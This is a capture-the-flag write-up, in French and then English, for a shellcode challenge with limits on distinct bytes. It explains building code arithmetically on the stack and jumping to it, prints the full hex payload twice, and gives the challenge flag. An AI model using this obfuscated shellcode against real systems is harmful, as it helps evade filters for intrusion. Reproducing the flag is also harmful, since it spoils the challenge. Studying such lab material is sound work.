# Shellcode Obfuscation 4
## Write-up
### Solution (Français)
Deux possibilitées de restrictions nous sont imposés.

La première offre la possibilité d'avoir un shellcode un peu plus long, mais qui demande 15 bytes distincts maximum.
La deuxième offre la possibilité d'avoir un shellcode plus court, mais qui demande 20 bytes distincts maximum.

Une solution possible est d'utiliser des opérations mathématique et sur les bytes pour push toute les bytes sur le stack avant de jump sur le stack et d'executer le code. Cela permet d'avoir un code assez long mais en utilisant relativement peu de bytes. Un example est disponnible dans le fichier create_bytecode.py

Payload: `\x48\x31\xc9\x48\xc1\xe1\x04\x48\x83\xc1\x04\x48\x83\xc1\x01\x48\xc1\xe1\x04\x48\xc1\xe1\x04\x48\x83\xc1\x0a\x48\x83\xc1\x04\x48\x83\xc1\x01\x48\xc1\xe1\x04\x48\x83\xc1\x04\x48\x83\xc1\x01\x48\xc1\xe1\x04\x48\x83\xc1\x08\x51\x48\x31\xc9\x48\xc1\xe1\x04\x48\x83\xc1\x01\x48\xc1\xe1\x04\x48\x83\xc1\x06\x48\xc1\xe1\x04\x48\x83\xc1\x0a\x48\xc1\xe1\x04\x48\x83\xc1\x04\x48\x83\xc1\x01\x48\xc1\xe1\x04\x48\x83\xc1\x0a\x48\x83\xc1\x04\x48\xc1\xe1\x04\x48\x83\xc1\x04\x48\x83\xc1\x01\x48\xc1\xe1\x04\x48\x83\xc1\x04\x48\xc1\xe1\x04\x48\x83\xc1\x04\x48\x83\xc1\x01\x48\xc1\xe1\x04\x48\x83\xc1\x0a\x48\xc1\xe1\x04\x48\xc1\xe1\x04\x48\x83\xc1\x08\x48\x83\xc1\x01\x48\xc1\xe1\x04\x48\x83\xc1\x06\x48\xc1\xe1\x04\x48\x83\xc1\x0a\x48\xc1\xe1\x04\x48\x83\xc1\x04\x48\x83\xc1\x01\x48\xc1\xe1\x04\x48\x83\xc1\x0a\x48\x83\xc1\x04\x48\x83\xc1\x01\x51\x48\x31\xc9\x48\xc1\xe1\x04\x48\x83\xc1\x01\x48\xc1\xe1\x04\x48\x83\xc1\x06\x48\xc1\xe1\x04\x48\x83\xc1\x0a\x48\xc1\xe1\x04\x48\x83\xc1\x04\x48\x83\xc1\x01\x48\xc1\xe1\x04\x48\x83\xc1\x02\x48\xc1\xe1\x04\x48\x83\xc1\x04\x48\xc1\xe1\x04\x48\x83\xc1\x01\x48\xc1\xe1\x04\x48\x83\xc1\x04\x48\x83\xc1\x01\x48\xc1\xe1\x04\x48\x83\xc1\x04\x48\xc1\xe1\x04\x48\x83\xc1\x04\x48\xc1\xe1\x04\x48\x83\xc1\x02\x48\x83\xc1\x01\x48\xc1\xe1\x04\x48\x83\xc1\x06\x48\xc1\xe1\x04\x48\x83\xc1\x04\x48\xc1\xe1\x04\x48\x83\xc1\x06\x48\xc1\xe1\x04\x48\x83\xc1\x04\x48\x83\xc1\x01\x51\x48\x31\xc9\x48\x83\xc1\x06\x48\x83\xc1\x01\x48\xc1\xe1\x04\x48\x83\xc1\x04\x48\xc1\xe1\x04\x48\x83\xc1\x06\x48\xc1\xe1\x04\x48\x83\xc1\x08\x48\x83\xc1\x01\x48\xc1\xe1\x04\x48\x83\xc1\x06\x48\xc1\xe1\x04\x48\x83\xc1\x0a\x48\x83\xc1\x04\x48\xc1\xe1\x04\x48\x83\xc1\x04\x48\x83\xc1\x01\x48\xc1\xe1\x04\x48\x83\xc1\x04\x48\x83\xc1\x01\x48\xc1\xe1\x04\x48\x83\xc1\x0a\x48\x83\xc1\x01\x48\xc1\xe1\x04\x48\x83\xc1\x0a\x48\xc1\xe1\x04\x48\x83\xc1\x04\x48\xc1\xe1\x04\x48\x83\xc1\x08\x48\x83\xc1\x01\x48\xc1\xe1\x04\x48\x83\xc1\x04\x48\xc1\xe1\x04\x48\x83\xc1\x06\x48\xc1\xe1\x04\x48\x83\xc1\x06\x48\xc1\xe1\x04\x48\x83\xc1\x0a\x51\x48\x31\xc9\xff\xe4`

Une autre solution serait d'avoir un stager ecrit en suivant nos restriction de bytes afin de décoder un payload.

Flag: `flag-R6YA2C3DZ8V7T9JPX9F3K7ZQ2JPXLMN4`
### Solution (English)
Two restrictions are imposed on us.

The first offers the possibility of having a slightly longer shellcode, but which requires a maximum of 15 distinct bytes.
The second offers the possibility of having a shorter shellcode, but which requires a maximum of 20 distinct bytes.

One possible solution is to use mathematical operations and on the bytes to push all the bytes on the stack before jumping on the stack and executing the code. This allows you to have a fairly long code but using relatively few bytes. An example is available in the file create_bytecode.py

Payload: `\x48\x31\xc9\x48\xc1\xe1\x04\x48\x83\xc1\x04\x48\x83\xc1\x01\x48\xc1\xe1\x04\x48\xc1\xe1\x04\x48\x83\xc1\x0a\x48\x83\xc1\x04\x48\x83\xc1\x01\x48\xc1\xe1\x04\x48\x83\xc1\x04\x48\x83\xc1\x01\x48\xc1\xe1\x04\x48\x83\xc1\x08\x51\x48\x31\xc9\x48\xc1\xe1\x04\x48\x83\xc1\x01\x48\xc1\xe1\x04\x48\x83\xc1\x06\x48\xc1\xe1\x04\x48\x83\xc1\x0a\x48\xc1\xe1\x04\x48\x83\xc1\x04\x48\x83\xc1\x01\x48\xc1\xe1\x04\x48\x83\xc1\x0a\x48\x83\xc1\x04\x48\xc1\xe1\x04\x48\x83\xc1\x04\x48\x83\xc1\x01\x48\xc1\xe1\x04\x48\x83\xc1\x04\x48\xc1\xe1\x04\x48\x83\xc1\x04\x48\x83\xc1\x01\x48\xc1\xe1\x04\x48\x83\xc1\x0a\x48\xc1\xe1\x04\x48\xc1\xe1\x04\x48\x83\xc1\x08\x48\x83\xc1\x01\x48\xc1\xe1\x04\x48\x83\xc1\x06\x48\xc1\xe1\x04\x48\x83\xc1\x0a\x48\xc1\xe1\x04\x48\x83\xc1\x04\x48\x83\xc1\x01\x48\xc1\xe1\x04\x48\x83\xc1\x0a\x48\x83\xc1\x04\x48\x83\xc1\x01\x51\x48\x31\xc9\x48\xc1\xe1\x04\x48\x83\xc1\x01\x48\xc1\xe1\x04\x48\x83\xc1\x06\x48\xc1\xe1\x04\x48\x83\xc1\x0a\x48\xc1\xe1\x04\x48\x83\xc1\x04\x48\x83\xc1\x01\x48\xc1\xe1\x04\x48\x83\xc1\x02\x48\xc1\xe1\x04\x48\x83\xc1\x04\x48\xc1\xe1\x04\x48\x83\xc1\x01\x48\xc1\xe1\x04\x48\x83\xc1\x04\x48\x83\xc1\x01\x48\xc1\xe1\x04\x48\x83\xc1\x04\x48\xc1\xe1\x04\x48\x83\xc1\x04\x48\xc1\xe1\x04\x48\x83\xc1\x02\x48\x83\xc1\x01\x48\xc1\xe1\x04\x48\x83\xc1\x06\x48\xc1\xe1\x04\x48\x83\xc1\x04\x48\xc1\xe1\x04\x48\x83\xc1\x06\x48\xc1\xe1\x04\x48\x83\xc1\x04\x48\x83\xc1\x01\x51\x48\x31\xc9\x48\x83\xc1\x06\x48\x83\xc1\x01\x48\xc1\xe1\x04\x48\x83\xc1\x04\x48\xc1\xe1\x04\x48\x83\xc1\x06\x48\xc1\xe1\x04\x48\x83\xc1\x08\x48\x83\xc1\x01\x48\xc1\xe1\x04\x48\x83\xc1\x06\x48\xc1\xe1\x04\x48\x83\xc1\x0a\x48\x83\xc1\x04\x48\xc1\xe1\x04\x48\x83\xc1\x04\x48\x83\xc1\x01\x48\xc1\xe1\x04\x48\x83\xc1\x04\x48\x83\xc1\x01\x48\xc1\xe1\x04\x48\x83\xc1\x0a\x48\x83\xc1\x01\x48\xc1\xe1\x04\x48\x83\xc1\x0a\x48\xc1\xe1\x04\x48\x83\xc1\x04\x48\xc1\xe1\x04\x48\x83\xc1\x08\x48\x83\xc1\x01\x48\xc1\xe1\x04\x48\x83\xc1\x04\x48\xc1\xe1\x04\x48\x83\xc1\x06\x48\xc1\xe1\x04\x48\x83\xc1\x06\x48\xc1\xe1\x04\x48\x83\xc1\x0a\x51\x48\x31\xc9\xff\xe4`

Another solution would be to have a stager written following our byte restrictions in order to decode a payload.

Flag: `flag-R6YA2C3DZ8V7T9JPX9F3K7ZQ2JPXLMN4`